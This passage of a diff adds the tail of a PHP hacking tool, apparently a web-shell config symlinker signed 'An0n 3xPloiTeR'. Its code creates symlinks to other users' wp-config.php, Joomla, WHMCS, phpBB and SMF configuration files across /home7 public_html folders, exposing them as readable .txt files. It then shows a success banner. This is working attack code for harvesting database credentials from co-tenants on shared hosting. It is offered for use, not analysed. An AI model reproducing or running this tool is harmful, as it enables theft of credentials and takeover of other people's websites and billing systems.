+@symlink('/home7/' . $user . '/public_html/wp-config.php', $user . '-Wordpress1.txt');
+@symlink('/home7/' . $user . '/public_html/blog/wp-config.php', $user . '-Wordpress2.txt');
+@symlink('/home7/' . $user . '/public_html/wp/wp-config.php', $user . '-Wordpress3.txt');
+@symlink('/home7/' . $user . '/public_html/home/wp-config.php', $user . '-Wordpress4.txt');
+@symlink('/home7/' . $user . '/public_html/main/wp-config.php', $user . '-Wordpress5.txt');
+@symlink('/home7/' . $user . '/public_html/site/wp-config.php', $user . '-Wordpress6.txt');
+@symlink('/home7/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
+@symlink('/home7/' . $user . '/public_html/blog/configuration.php', $user . '-Joomla2.txt');
+@symlink('/home7/' . $user . '/public_html/joomla/configuration.php', $user . '-Joomla3.txt');
+@symlink('/home7/' . $user . '/public_html/main/configuration.php', $user . '-Joomla4.txt');
+@symlink('/home7/' . $user . '/public_html/home/configuration.php', $user . '-Joomla5.txt');
+@symlink('/home7/' . $user . '/public_html/site/configuration.php', $user . '-Joomla6.txt');
+@symlink('/home7/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
+@symlink('/home7/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
+@symlink('/home7/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
+@symlink('/home7/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
+@symlink('/home7/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
+@symlink('/home7/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
+@symlink('/home7/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
+@symlink('/home7/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
+@symlink('/home7/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
+@symlink('/home7/' . $user . '/public_html/admin/conf.php', $user . '-Other1.txt');
+@symlink('/home7/' . $user . '/public_html/admin/config.php', $user . '-Other2.txt');
+@symlink('/home7/' . $user . '/public_html/conf_global.php', $user . '-invisio.txt');
+@symlink('/home7/' . $user . '/public_html/include/db.php', $user . '-Other3.txt');
+@symlink('/home7/' . $user . '/public_html/connect.php', $user . '-Other4.txt');
+@symlink('/home7/' . $user . '/public_html/mk_conf.php', $user . '-mk-portale1.txt');
+@symlink('/home7/' . $user . '/public_html/include/config.php', $user . '-Other5.txt');
+@symlink('/home7/' . $user . '/public_html/settings.php', $user . '-Smf.txt');
+@symlink('/home7/' . $user . '/public_html/includes/functions.php', $user . '-phpbb3.txt');
+@symlink('/home7/' . $user . '/public_html/include/db.php', $user . '-infinity.txt');
+                            }
+                            echo '
+                            <div class="symlink_done">
+                                <font><br>Congrats Symlinking of Config Files Done !!!</font><br>
+                                <font><br>
+                                    <a target="_blank" href="UeXploiT">Config List</a>
+                                </font>
+                            </div>
+                            <br><br>
+                            ';
+                        }
+                    }
+                ?>
+            </font>
+        <div class="footer">
+            <font>
+            Developed By 
+                <span style="color: red;">
+                    <a href="https://www.google.com/search?q=An0n 3xPloiTeR" target="_blank">An0n 3xPloiTeR</a>
+                </span>
+            </font>
+        </div>
+    </body>
+</html>
